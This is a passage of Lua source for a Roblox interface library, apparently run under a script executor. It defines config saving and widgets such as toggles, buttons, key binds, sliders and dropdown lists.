				if option.type == "toggle" then
					Config[option.flag] = option.state and 1 or 0
				elseif option.type == "color" then
					Config[option.flag] = {option.color.r, option.color.g, option.color.b}
					if option.trans then
						Config[option.flag .. " Transparency"] = option.trans
					end
				elseif option.type == "bind" then
					if option.key ~= "none" then
						Config[option.flag] = option.key
					end
				elseif option.type == "list" then
					Config[option.flag] = option.value
				else
					Config[option.flag] = option.value
				end
			end
		end
		writefile(self.foldername .. "/" .. config .. self.fileext, game:GetService"HttpService":JSONEncode(Config))
	end

	function library:GetConfigs()
		if not isfolder(self.foldername) then
			makefolder(self.foldername)
			return {}
		end
		local files = {}
		local a = 0
		for i,v in next, listfiles(self.foldername) do
			if v:sub(#v - #self.fileext + 1, #v) == self.fileext then
				a = a + 1
				v = v:gsub(self.foldername .. "\\", "")
				v = v:gsub(self.fileext, "")
				table.insert(files, a, v)
			end
		end
		return files
	end

	library.createLabel = function(option, parent)
		option.main = library:Create("TextLabel", {
			LayoutOrder = option.position,
			Position = UDim2.new(0, 6, 0, 0),
			Size = UDim2.new(1, -12, 0, 24),
			BackgroundTransparency = 1,
			TextSize = 15,
			Font = Enum.Font.Code,
			TextColor3 = Color3.new(1, 1, 1),
			TextXAlignment = Enum.TextXAlignment.Left,
			TextYAlignment = Enum.TextYAlignment.Top,
			TextWrapped = true,
			Parent = parent
		})

		setmetatable(option, {__newindex = function(t, i, v)
			if i == "Text" then
				option.main.Text = tostring(v)
				option.main.Size = UDim2.new(1, -12, 0, textService:GetTextSize(option.main.Text, 15, Enum.Font.Code, Vector2.new(option.main.AbsoluteSize.X, 9e9)).Y + 6)
			end
		end})
		option.Text = option.text
	end

	library.createDivider = function(option, parent)
		option.main = library:Create("Frame", {
			LayoutOrder = option.position,
			Size = UDim2.new(1, 0, 0, 18),
			BackgroundTransparency = 1,
			Parent = parent
		})

		library:Create("Frame", {
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.new(0.5, 0, 0.5, 0),
			Size = UDim2.new(1, -24, 0, 1),
			BackgroundColor3 = Color3.fromRGB(60, 60, 60),
			BorderColor3 = Color3.new(),
			Parent = option.main
		})

		option.title = library:Create("TextLabel", {
			AnchorPoint = Vector2.new(0.5, 0.5),
			Position = UDim2.new(0.5, 0, 0.5, 0),
			BackgroundColor3 = Color3.fromRGB(30, 30, 30),
			BorderSizePixel = 0,
			TextColor3 =  Color3.new(1, 1, 1),
			TextSize = 15,
			Font = Enum.Font.Code,
			TextXAlignment = Enum.TextXAlignment.Center,
			Parent = option.main
		})

		setmetatable(option, {__newindex = function(t, i, v)
			if i == "Text" then
				if v then
					option.title.Text = tostring(v)
					option.title.Size = UDim2.new(0, textService:GetTextSize(option.title.Text, 15, Enum.Font.Code, Vector2.new(9e9, 9e9)).X + 12, 0, 20)
					option.main.Size = UDim2.new(1, 0, 0, 18)
				else
					option.title.Text = ""
					option.title.Size = UDim2.new()
					option.main.Size = UDim2.new(1, 0, 0, 6)
				end
			end
		end})
		option.Text = option.text
	end

	library.createToggle = function(option, parent)
		option.hasInit = true

		option.main = library:Create("Frame", {
			LayoutOrder = option.position,
			Size = UDim2.new(1, 0, 0, 20),
			BackgroundTransparency = 1,
			Parent = parent
		})

		local tickbox
		local tickboxOverlay
		if option.style then
			tickbox = library:Create("ImageLabel", {
				Position = UDim2.new(0, 6, 0, 4),
				Size = UDim2.new(0, 12, 0, 12),
				BackgroundTransparency = 1,
				Image = "rbxassetid://3570695787",
				ImageColor3 = Color3.new(),
				Parent = option.main
			})

			library:Create("ImageLabel", {
				AnchorPoint = Vector2.new(0.5, 0.5),
				Position = UDim2.new(0.5, 0, 0.5, 0),
				Size = UDim2.new(1, -2, 1, -2),
				BackgroundTransparency = 1,
				Image = "rbxassetid://3570695787",
				ImageColor3 = Color3.fromRGB(60, 60, 60),
				Parent = tickbox
			})

			library:Create("ImageLabel", {
				AnchorPoint = Vector2.new(0.5, 0.5),
				Position = UDim2.new(0.5, 0, 0.5, 0),
				Size = UDim2.new(1, -6, 1, -6),
				BackgroundTransparency = 1,
				Image = "rbxassetid://3570695787",
				ImageColor3 = Color3.fromRGB(40, 40, 40),
				Parent = tickbox
			})

			tickboxOverlay = library:Create("ImageLabel", {
				AnchorPoint = Vector2.new(0.5, 0.5),
				Position = UDim2.new(0.5, 0, 0.5, 0),
				Size = UDim2.new(1, -6, 1, -6),
				BackgroundTransparency = 1,
				Image = "rbxassetid://3570695787",
				ImageColor3 = library.flags["Menu Accent Color"],
				Visible = option.state,
				Parent = tickbox
			})

			library:Create("ImageLabel", {
				AnchorPoint = Vector2.new(0.5, 0.5),
				Position = UDim2.new(0.5, 0, 0.5, 0),
				Size = UDim2.new(1, 0, 1, 0),
				BackgroundTransparency = 1,
				Image = "rbxassetid://5941353943",
				ImageTransparency = 0.6,
				Parent = tickbox
			})

			table.insert(library.theme, tickboxOverlay)
		else
			tickbox = library:Create("Frame", {
				Position = UDim2.new(0, 6, 0, 4),
				Size = UDim2.new(0, 12, 0, 12),
				BackgroundColor3 = library.flags["Menu Accent Color"],
				BorderColor3 = Color3.new(),
				Parent = option.main
			})

			tickboxOverlay = library:Create("ImageLabel", {
				Size = UDim2.new(1, 0, 1, 0),
				BackgroundTransparency = option.state and 1 or 0,
				BackgroundColor3 = Color3.fromRGB(50, 50, 50),
				BorderColor3 = Color3.new(),
				Image = "rbxassetid://4155801252",
				ImageTransparency = 0.6,
				ImageColor3 = Color3.new(),
				Parent = tickbox
			})

			library:Create("ImageLabel", {
				Size = UDim2.new(1, 0, 1, 0),
				BackgroundTransparency = 1,
				Image = "rbxassetid://2592362371",
				ImageColor3 = Color3.fromRGB(60, 60, 60),
				ScaleType = Enum.ScaleType.Slice,
				SliceCenter = Rect.new(2, 2, 62, 62),
				Parent = tickbox
			})

			library:Create("ImageLabel", {
				Size = UDim2.new(1, -2, 1, -2),
				Position = UDim2.new(0, 1, 0, 1),
				BackgroundTransparency = 1,
				Image = "rbxassetid://2592362371",
				ImageColor3 = Color3.new(),
				ScaleType = Enum.ScaleType.Slice,
				SliceCenter = Rect.new(2, 2, 62, 62),
				Parent = tickbox
			})

			table.insert(library.theme, tickbox)
		end

		option.interest = library:Create("Frame", {
			Position = UDim2.new(0, 0, 0, 0),
			Size = UDim2.new(1, 0, 0, 20),
			BackgroundTransparency = 1,
			Parent = option.main
		})

		option.title = library:Create("TextLabel", {
			Position = UDim2.new(0, 24, 0, 0),
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			Text = option.text,
			TextColor3 =  option.state and Color3.fromRGB(210, 210, 210) or Color3.fromRGB(180, 180, 180),
			TextSize = 15,
			Font = Enum.Font.Code,
			TextXAlignment = Enum.TextXAlignment.Left,
			Parent = option.interest
		})

		option.interest.InputBegan:connect(function(input)
			if input.UserInputType.Name == "MouseButton1" then
				option:SetState(not option.state)
			end
			if input.UserInputType.Name == "MouseMovement" then
				if not library.warning and not library.slider then
					if option.style then
						tickbox.ImageColor3 = library.flags["Menu Accent Color"]
						--tweenService:Create(tickbox, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = library.flags["Menu Accent Color"]}):Play()
					else
						tickbox.BorderColor3 = library.flags["Menu Accent Color"]
						tickboxOverlay.BorderColor3 = library.flags["Menu Accent Color"]
						--tweenService:Create(tickbox, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = library.flags["Menu Accent Color"]}):Play()
						--tweenService:Create(tickboxOverlay, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = library.flags["Menu Accent Color"]}):Play()
					end
				end
				if option.tip then
					library.tooltip.Text = option.tip
					library.tooltip.Size = UDim2.new(0, textService:GetTextSize(option.tip, 15, Enum.Font.Code, Vector2.new(9e9, 9e9)).X, 0, 20)
				end
			end
		end)

		option.interest.InputChanged:connect(function(input)
			if input.UserInputType.Name == "MouseMovement" then
				if option.tip then
					library.tooltip.Position = UDim2.new(0, input.Position.X + 26, 0, input.Position.Y + 36)
				end
			end
		end)

		option.interest.InputEnded:connect(function(input)
			if input.UserInputType.Name == "MouseMovement" then
				if option.style then
					tickbox.ImageColor3 = Color3.new()
					--tweenService:Create(tickbox, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageColor3 = Color3.new()}):Play()
				else
					tickbox.BorderColor3 = Color3.new()
					tickboxOverlay.BorderColor3 = Color3.new()
					--tweenService:Create(tickbox, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = Color3.new()}):Play()
					--tweenService:Create(tickboxOverlay, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = Color3.new()}):Play()
				end
				library.tooltip.Position = UDim2.new(2)
			end
		end)

		function option:SetState(state, nocallback)
			state = typeof(state) == "boolean" and state
			state = state or false
			library.flags[self.flag] = state
			self.state = state
			option.title.TextColor3 = state and Color3.fromRGB(210, 210, 210) or Color3.fromRGB(160, 160, 160)
			if option.style then
				tickboxOverlay.Visible = state
			else
				tickboxOverlay.BackgroundTransparency = state and 1 or 0
			end
			if not nocallback then
				self.callback(state)
			end
		end

		if option.state ~= nil then
			delay(1, function()
				if library then
					option.callback(option.state)
				end
			end)
		end

		setmetatable(option, {__newindex = function(t, i, v)
			if i == "Text" then
				option.title.Text = tostring(v)
			end
		end})
	end

	library.createButton = function(option, parent)
		option.hasInit = true

		option.main = library:Create("Frame", {
			LayoutOrder = option.position,
			Size = UDim2.new(1, 0, 0, 28),
			BackgroundTransparency = 1,
			Parent = parent
		})

		option.title = library:Create("TextLabel", {
			AnchorPoint = Vector2.new(0.5, 1),
			Position = UDim2.new(0.5, 0, 1, -5),
			Size = UDim2.new(1, -12, 0, 20),
			BackgroundColor3 = Color3.fromRGB(50, 50, 50),
			BorderColor3 = Color3.new(),
			Text = option.text,
			TextColor3 = Color3.new(1, 1, 1),
			TextSize = 15,
			Font = Enum.Font.Code,
			Parent = option.main
		})

		library:Create("ImageLabel", {
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2592362371",
			ImageColor3 = Color3.fromRGB(60, 60, 60),
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(2, 2, 62, 62),
			Parent = option.title
		})

		library:Create("ImageLabel", {
			Size = UDim2.new(1, -2, 1, -2),
			Position = UDim2.new(0, 1, 0, 1),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2592362371",
			ImageColor3 = Color3.new(),
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(2, 2, 62, 62),
			Parent = option.title
		})

		library:Create("UIGradient", {
			Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 180, 180)),
				ColorSequenceKeypoint.new(1, Color3.fromRGB(253, 253, 253)),
			}),
			Rotation = -90,
			Parent = option.title
		})

		option.title.InputBegan:connect(function(input)
			if input.UserInputType.Name == "MouseButton1" then
				option.callback()
				if library then
					library.flags[option.flag] = true
				end
				if option.tip then
					library.tooltip.Text = option.tip
					library.tooltip.Size = UDim2.new(0, textService:GetTextSize(option.tip, 15, Enum.Font.Code, Vector2.new(9e9, 9e9)).X, 0, 20)
				end
			end
			if input.UserInputType.Name == "MouseMovement" then
				if not library.warning and not library.slider then
					option.title.BorderColor3 = library.flags["Menu Accent Color"]
				end
			end
		end)

		option.title.InputChanged:connect(function(input)
			if input.UserInputType.Name == "MouseMovement" then
				if option.tip then
					library.tooltip.Position = UDim2.new(0, input.Position.X + 26, 0, input.Position.Y + 36)
				end
			end
		end)

		option.title.InputEnded:connect(function(input)
			if input.UserInputType.Name == "MouseMovement" then
				option.title.BorderColor3 = Color3.new()
				library.tooltip.Position = UDim2.new(2)
			end
		end)
	end

	library.createBind = function(option, parent)
		option.hasInit = true

		local binding
		local holding
		local Loop

		if option.sub then
			option.main = option:getMain()
		else
			option.main = option.main or library:Create("Frame", {
				LayoutOrder = option.position,
				Size = UDim2.new(1, 0, 0, 20),
				BackgroundTransparency = 1,
				Parent = parent
			})

			library:Create("TextLabel", {
				Position = UDim2.new(0, 6, 0, 0),
				Size = UDim2.new(1, -12, 1, 0),
				BackgroundTransparency = 1,
				Text = option.text,
				TextSize = 15,
				Font = Enum.Font.Code,
				TextColor3 = Color3.fromRGB(210, 210, 210),
				TextXAlignment = Enum.TextXAlignment.Left,
				Parent = option.main
			})
		end

		local bindinput = library:Create(option.sub and "TextButton" or "TextLabel", {
			Position = UDim2.new(1, -6 - (option.subpos or 0), 0, option.sub and 2 or 3),
			SizeConstraint = Enum.SizeConstraint.RelativeYY,
			BackgroundColor3 = Color3.fromRGB(30, 30, 30),
			BorderSizePixel = 0,
			TextSize = 15,
			Font = Enum.Font.Code,
			TextColor3 = Color3.fromRGB(160, 160, 160),
			TextXAlignment = Enum.TextXAlignment.Right,
			Parent = option.main
		})

		if option.sub then
			bindinput.AutoButtonColor = false
		end

		local interest = option.sub and bindinput or option.main
		local inContact
		interest.InputEnded:connect(function(input)
			if input.UserInputType.Name == "MouseButton1" then
				binding = true
				bindinput.Text = "[...]"
				bindinput.Size = UDim2.new(0, -textService:GetTextSize(bindinput.Text, 16, Enum.Font.Code, Vector2.new(9e9, 9e9)).X, 0, 16)
				bindinput.TextColor3 = library.flags["Menu Accent Color"]
			end
		end)

		library:AddConnection(inputService.InputBegan, function(input)
			if inputService:GetFocusedTextBox() then return end
			if binding then
				local key = (table.find(whitelistedMouseinputs, input.UserInputType) and not option.nomouse) and input.UserInputType
				option:SetKey(key or (not table.find(blacklistedKeys, input.KeyCode)) and input.KeyCode)
			else
				if (input.KeyCode.Name == option.key or input.UserInputType.Name == option.key) and not binding then
					if option.mode == "toggle" then
						library.flags[option.flag] = not library.flags[option.flag]
						option.callback(library.flags[option.flag], 0)
					else
						library.flags[option.flag] = true
						if Loop then Loop:Disconnect() option.callback(true, 0) end
						Loop = library:AddConnection(runService.RenderStepped, function(step)
							if not inputService:GetFocusedTextBox() then
								option.callback(nil, step)
							end
						end)
					end
				end
			end
		end)

		library:AddConnection(inputService.InputEnded, function(input)
			if option.key ~= "none" then
				if input.KeyCode.Name == option.key or input.UserInputType.Name == option.key then
					if Loop then
						Loop:Disconnect()
						library.flags[option.flag] = false
						option.callback(true, 0)
					end
				end
			end
		end)

		function option:SetKey(key)
			binding = false
			bindinput.TextColor3 = Color3.fromRGB(160, 160, 160)
			if Loop then Loop:Disconnect() library.flags[option.flag] = false option.callback(true, 0) end
			self.key = (key and key.Name) or key or self.key
			if self.key == "Backspace" then
				self.key = "none"
				bindinput.Text = "[NONE]"
			else
				local a = self.key
				if self.key:match"Mouse" then
					a = self.key:gsub("Button", ""):gsub("Mouse", "M")
				elseif self.key:match"Shift" or self.key:match"Alt" or self.key:match"Control" then
					a = self.key:gsub("Left", "L"):gsub("Right", "R")
				end
				bindinput.Text = "[" .. a:gsub("Control", "CTRL"):upper() .. "]"
			end
			bindinput.Size = UDim2.new(0, -textService:GetTextSize(bindinput.Text, 16, Enum.Font.Code, Vector2.new(9e9, 9e9)).X, 0, 16)
		end
		option:SetKey()
	end

	library.createSlider = function(option, parent)
		option.hasInit = true

		if option.sub then
			option.main = option:getMain()
			option.main.Size = UDim2.new(1, 0, 0, 42)
		else
			option.main = library:Create("Frame", {
				LayoutOrder = option.position,
				Size = UDim2.new(1, 0, 0, option.textpos and 24 or 40),
				BackgroundTransparency = 1,
				Parent = parent
			})
		end

		option.slider = library:Create("Frame", {
			Position = UDim2.new(0, 6, 0, (option.sub and 22 or option.textpos and 4 or 20)),
			Size = UDim2.new(1, -12, 0, 16),
			BackgroundColor3 = Color3.fromRGB(50, 50, 50),
			BorderColor3 = Color3.new(),
			Parent = option.main
		})

		library:Create("ImageLabel", {
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2454009026",
			ImageColor3 = Color3.new(),
			ImageTransparency = 0.8,
			Parent = option.slider
		})

		option.fill = library:Create("Frame", {
			BackgroundColor3 = library.flags["Menu Accent Color"],
			BorderSizePixel = 0,
			Parent = option.slider
		})

		library:Create("ImageLabel", {
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2592362371",
			ImageColor3 = Color3.fromRGB(60, 60, 60),
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(2, 2, 62, 62),
			Parent = option.slider
		})

		library:Create("ImageLabel", {
			Size = UDim2.new(1, -2, 1, -2),
			Position = UDim2.new(0, 1, 0, 1),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2592362371",
			ImageColor3 = Color3.new(),
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(2, 2, 62, 62),
			Parent = option.slider
		})

		option.title = library:Create("TextBox", {
			Position = UDim2.new((option.sub or option.textpos) and 0.5 or 0, (option.sub or option.textpos) and 0 or 6, 0, 0),
			Size = UDim2.new(0, 0, 0, (option.sub or option.textpos) and 14 or 18),
			BackgroundTransparency = 1,
			Text = (option.text == "nil" and "" or option.text .. ": ") .. option.value .. option.suffix,
			TextSize = (option.sub or option.textpos) and 14 or 15,
			Font = Enum.Font.Code,
			TextColor3 = Color3.fromRGB(210, 210, 210),
			TextXAlignment = Enum.TextXAlignment[(option.sub or option.textpos) and "Center" or "Left"],
			Parent = (option.sub or option.textpos) and option.slider or option.main
		})
		table.insert(library.theme, option.fill)

		library:Create("UIGradient", {
			Color = ColorSequence.new({
				ColorSequenceKeypoint.new(0, Color3.fromRGB(115, 115, 115)),
				ColorSequenceKeypoint.new(1, Color3.new(1, 1, 1)),
			}),
			Rotation = -90,
			Parent = option.fill
		})

		if option.min >= 0 then
			option.fill.Size = UDim2.new((option.value - option.min) / (option.max - option.min), 0, 1, 0)
		else
			option.fill.Position = UDim2.new((0 - option.min) / (option.max - option.min), 0, 0, 0)
			option.fill.Size = UDim2.new(option.value / (option.max - option.min), 0, 1, 0)
		end

		local manualInput
		option.title.Focused:connect(function()
			if not manualInput then
				option.title:ReleaseFocus()
				option.title.Text = (option.text == "nil" and "" or option.text .. ": ") .. option.value .. option.suffix
			end
		end)

		option.title.FocusLost:connect(function()
			option.slider.BorderColor3 = Color3.new()
			if manualInput then
				if tonumber(option.title.Text) then
					option:SetValue(tonumber(option.title.Text))
				else
					option.title.Text = (option.text == "nil" and "" or option.text .. ": ") .. option.value .. option.suffix
				end
			end
			manualInput = false
		end)

		local interest = (option.sub or option.textpos) and option.slider or option.main
		interest.InputBegan:connect(function(input)
			if input.UserInputType.Name == "MouseButton1" then
				if inputService:IsKeyDown(Enum.KeyCode.LeftControl) or inputService:IsKeyDown(Enum.KeyCode.RightControl) then
					manualInput = true
					option.title:CaptureFocus()
				else
					library.slider = option
					option.slider.BorderColor3 = library.flags["Menu Accent Color"]
					option:SetValue(option.min + ((input.Position.X - option.slider.AbsolutePosition.X) / option.slider.AbsoluteSize.X) * (option.max - option.min))
				end
			end
			if input.UserInputType.Name == "MouseMovement" then
				if not library.warning and not library.slider then
					option.slider.BorderColor3 = library.flags["Menu Accent Color"]
				end
				if option.tip then
					library.tooltip.Text = option.tip
					library.tooltip.Size = UDim2.new(0, textService:GetTextSize(option.tip, 15, Enum.Font.Code, Vector2.new(9e9, 9e9)).X, 0, 20)
				end
			end
		end)

		interest.InputChanged:connect(function(input)
			if input.UserInputType.Name == "MouseMovement" then
				if option.tip then
					library.tooltip.Position = UDim2.new(0, input.Position.X + 26, 0, input.Position.Y + 36)
				end
			end
		end)

		interest.InputEnded:connect(function(input)
			if input.UserInputType.Name == "MouseMovement" then
				library.tooltip.Position = UDim2.new(2)
				if option ~= library.slider then
					option.slider.BorderColor3 = Color3.new()
					--option.fill.BorderColor3 = Color3.new()
				end
			end
		end)

		function option:SetValue(value, nocallback)
			if typeof(value) ~= "number" then value = 0 end
			value = library.round(value, option.float)
			value = math.clamp(value, self.min, self.max)
			if self.min >= 0 then
				option.fill:TweenSize(UDim2.new((value - self.min) / (self.max - self.min), 0, 1, 0), "Out", "Quad", 0.05, true)
			else
				option.fill:TweenPosition(UDim2.new((0 - self.min) / (self.max - self.min), 0, 0, 0), "Out", "Quad", 0.05, true)
				option.fill:TweenSize(UDim2.new(value / (self.max - self.min), 0, 1, 0), "Out", "Quad", 0.1, true)
			end
			library.flags[self.flag] = value
			self.value = value
			option.title.Text = (option.text == "nil" and "" or option.text .. ": ") .. option.value .. option.suffix
			if not nocallback then
				self.callback(value)
			end
		end
		delay(1, function()
			if library then
				option:SetValue(option.value)
			end
		end)
	end

	library.createList = function(option, parent)
		option.hasInit = true

		if option.sub then
			option.main = option:getMain()
			option.main.Size = UDim2.new(1, 0, 0, 48)
		else
			option.main = library:Create("Frame", {
				LayoutOrder = option.position,
				Size = UDim2.new(1, 0, 0, option.text == "nil" and 30 or 48),
				BackgroundTransparency = 1,
				Parent = parent
			})

			if option.text ~= "nil" then
				library:Create("TextLabel", {
					Position = UDim2.new(0, 6, 0, 0),
					Size = UDim2.new(1, -12, 0, 18),
					BackgroundTransparency = 1,
					Text = option.text,
					TextSize = 15,
					Font = Enum.Font.Code,
					TextColor3 = Color3.fromRGB(210, 210, 210),
					TextXAlignment = Enum.TextXAlignment.Left,
					Parent = option.main
				})
			end
		end

		local function getMultiText()
			local s = ""
			for _, value in next, option.values do
				s = s .. (option.value[value] and (tostring(value) .. ", ") or "")
			end
			return string.sub(s, 1, #s - 2)
		end

		option.listvalue = library:Create("TextLabel", {
			Position = UDim2.new(0, 6, 0, (option.text == "nil" and not option.sub) and 4 or 22),
			Size = UDim2.new(1, -12, 0, 22),
			BackgroundColor3 = Color3.fromRGB(50, 50, 50),
			BorderColor3 = Color3.new(),
			Text = " " .. (typeof(option.value) == "string" and option.value or getMultiText()),
			TextSize = 15,
			Font = Enum.Font.Code,
			TextColor3 = Color3.new(1, 1, 1),
			TextXAlignment = Enum.TextXAlignment.Left,
			TextTruncate = Enum.TextTruncate.AtEnd,
			Parent = option.main
		})

		library:Create("ImageLabel", {
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2454009026",
			ImageColor3 = Color3.new(),
			ImageTransparency = 0.8,
			Parent = option.listvalue
		})

		library:Create("ImageLabel", {
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2592362371",
			ImageColor3 = Color3.fromRGB(60, 60, 60),
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(2, 2, 62, 62),
			Parent = option.listvalue
		})

		library:Create("ImageLabel", {
			Size = UDim2.new(1, -2, 1, -2),
			Position = UDim2.new(0, 1, 0, 1),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2592362371",
			ImageColor3 = Color3.new(),
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(2, 2, 62, 62),
			Parent = option.listvalue
		})

		option.arrow = library:Create("ImageLabel", {
			Position = UDim2.new(1, -16, 0, 7),
			Size = UDim2.new(0, 8, 0, 8),
			Rotation = 90,
			BackgroundTransparency = 1,
			Image = "rbxassetid://4918373417",
			ImageColor3 = Color3.new(1, 1, 1),
			ScaleType = Enum.ScaleType.Fit,
			ImageTransparency = 0.4,
			Parent = option.listvalue
		})

		option.holder = library:Create("TextButton", {
			ZIndex = 4,
			BackgroundColor3 = Color3.fromRGB(40, 40, 40),
			BorderColor3 = Color3.new(),
			Text = "",
			AutoButtonColor = false,
			Visible = false,
			Parent = library.base
		})

		option.content = library:Create("ScrollingFrame", {
			ZIndex = 4,
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			BorderSizePixel = 0,
			ScrollBarImageColor3 = Color3.new(),
			ScrollBarThickness = 3,
			ScrollingDirection = Enum.ScrollingDirection.Y,
			VerticalScrollBarInset = Enum.ScrollBarInset.Always,
			TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png",
			BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png",
			Parent = option.holder
		})

		library:Create("ImageLabel", {
			ZIndex = 4,
			Size = UDim2.new(1, 0, 1, 0),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2592362371",
			ImageColor3 = Color3.fromRGB(60, 60, 60),
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(2, 2, 62, 62),
			Parent = option.holder
		})

		library:Create("ImageLabel", {
			ZIndex = 4,
			Size = UDim2.new(1, -2, 1, -2),
			Position = UDim2.new(0, 1, 0, 1),
			BackgroundTransparency = 1,
			Image = "rbxassetid://2592362371",
			ImageColor3 = Color3.new(),
			ScaleType = Enum.ScaleType.Slice,
			SliceCenter = Rect.new(2, 2, 62, 62),
			Parent = option.holder
		})

		local layout = library:Create("UIListLayout", {
			Padding = UDim.new(0, 2),
			Parent = option.content
		})

		library:Create("UIPadding", {
			PaddingTop = UDim.new(0, 4),
			PaddingLeft = UDim.new(0, 4),
			Parent = option.content
		})

		local valueCount = 0
		layout.Changed:connect(function()
			option.holder.Size = UDim2.new(0, option.listvalue.AbsoluteSize.X, 0, 8 + (valueCount > option.max and (-2 + (option.max * 22)) or layout.AbsoluteContentSize.Y))
			option.content.CanvasSize = UDim2.new(0, 0, 0, 8 + layout.AbsoluteContentSize.Y)
		end)
		local interest = option.sub and option.listvalue or option.main

		option.listvalue.InputBegan:connect(function(input)
			if input.UserInputType.Name == "MouseButton1" then
				if library.popup == option then library.popup:Close() return end
				if library.popup then
					library.popup:Close()
				end
				option.arrow.Rotation = -90
				option.open = true
				option.holder.Visible = true
				local pos = option.main.AbsolutePosition
				option.holder.Position = UDim2.new(0, pos.X + 6, 0, pos.Y + ((option.text == "nil" and not option.sub) and 66 or 84))
				library.popup = option
				option.listvalue.BorderColor3 = library.flags["Menu Accent Color"]
			end
			if input.UserInputType.Name == "MouseMovement" then
				if not library.warning and not library.slider then
					option.listvalue.BorderColor3 = library.flags["Menu Accent Color"]
				end
			end
		end)

		option.listvalue.InputEnded:connect(function(input)
			if input.UserInputType.Name == "MouseMovement" then
				if not option.open then
					option.listvalue.BorderColor3 = Color3.new()
				end
			end
		end)

		interest.InputBegan:connect(function(input)
			if input.UserInputType.Name == "MouseMovement" then
				if option.tip then
					library.tooltip.Text = option.tip
					library.tooltip.Size = UDim2.new(0, textService:GetTextSize(option.tip, 15, Enum.Font.Code, Vector2.new(9e9, 9e9)).X, 0, 20)
				end
			end
		end)

		interest.InputChanged:connect(function(input)
			if input.UserInputType.Name == "MouseMovement" then
				if option.tip then
					library.tooltip.Position = UDim2.new(0, input.Position.X + 26, 0, input.Position.Y + 36)
				end
			end
		end)

		interest.InputEnded:connect(function(input)
			if input.UserInputType.Name == "MouseMovement" then
				library.tooltip.Position = UDim2.new(2)
			end
		end)

		local selected
		function option:AddValue(value, state)
			if self.labels[value] then return end
			valueCount = valueCount + 1

			if self.multiselect then
				self.values[value] = state
			else
				if not table.find(self.values, value) then
					table.insert(self.values, value)
				end
			end

			local label = library:Create("TextLabel", {
				ZIndex = 4,
				Size = UDim2.new(1, 0, 0, 20),
				BackgroundTransparency = 1,
				Text = value,
				TextSize = 15,
				Font = Enum.Font.Code,
				TextTransparency = self.multiselect and (self.value[value] and 1 or 0) or self.value == value and 1 or 0,
				TextColor3 = Color3.fromRGB(210, 210, 210),
				TextXAlignment = Enum.TextXAlignment.Left,
				Parent = option.content
			})
			self.labels[value] = label

			local labelOverlay = library:Create("TextLabel", {
				ZIndex = 4,	
				Size = UDim2.new(1, 0, 1, 0),
				BackgroundTransparency = 0.8,
				Text = " " ..value,
				TextSize = 15,
				Font = Enum.Font.Code,
				TextColor3 = library.flags["Menu Accent Color"],
				TextXAlignment = Enum.TextXAlignment.Left,
				Visible = self.multiselect and self.value[value] or self.value == value,
				Parent = label
			})
			selected = selected or self.value == value and labelOverlay
			table.insert(library.theme, labelOverlay)

			label.InputBegan:connect(function(input)
				if input.UserInputType.Name == "MouseButton1" then
					if self.multiselect then
						self.value[value] = not self.value[value]
						self:SetValue(self.value)
					else
						self:SetValue(value)
						self:Close()
					end
				end
			end)
		end

		for i, value in next, option.values do
			option:AddValue(tostring(typeof(i) == "number" and value or i))
		end

		function option:RemoveValue(value)
			local label = self.labels[value]
			if label then
				label:Destroy()
				self.labels[value] = nil
				valueCount = valueCount - 1
				if self.multiselect then
					self.values[value] = nil
					self:SetValue(self.value)
				else
					table.remove(self.values, table.find(self.values, value))
					if self.value == value then
						selected = nil
						self:SetValue(self.values[1] or "")
					end
				end
			end
		end

		function option:SetValue(value, nocallback)
			if self.multiselect and typeof(value) ~= "table" then
				value = {}
				for i,v in next, self.values do
					value[v] = false
				end
			end
			self.value = typeof(value) == "table" and value or tostring(table.find(self.values, value) and value or self.values[1])
			library.flags[self.flag] = self.value
			option.listvalue.Text = " " .. (self.multiselect and getMultiText() or self.value)
			if self.multiselect then
				for name, label in next, self.labels do
					label.TextTransparency = self.value[name] and 1 or 0
					if label:FindFirstChild"TextLabel" then
						label.TextLabel.Visible = self.value[name]
					end
				end
			else
				if selected then
					selected.TextTransparency = 0
					if selected:FindFirstChild"TextLabel" then
						selected.TextLabel.Visible = false
					end
				end
				if self.labels[self.value] then
					selected = self.labels[self.value]
					selected.TextTransparency = 1
					if selected:FindFirstChild"TextLabel" then
						selected.TextLabel.Visible = true
					end
				end
			end
			if not nocallback then
				self.callback(self.value)
			end
		end
		delay(1, function()
			if library then
				option:SetValue(option.value)
			end
		end)

		function option:Close()
			library.popup = nil
			option.arrow.Rotation = 90
			self.open = false
			option.holder.Visible = false
			option.listvalue.BorderColor3 = Color3.new()
		end

		return option
	end

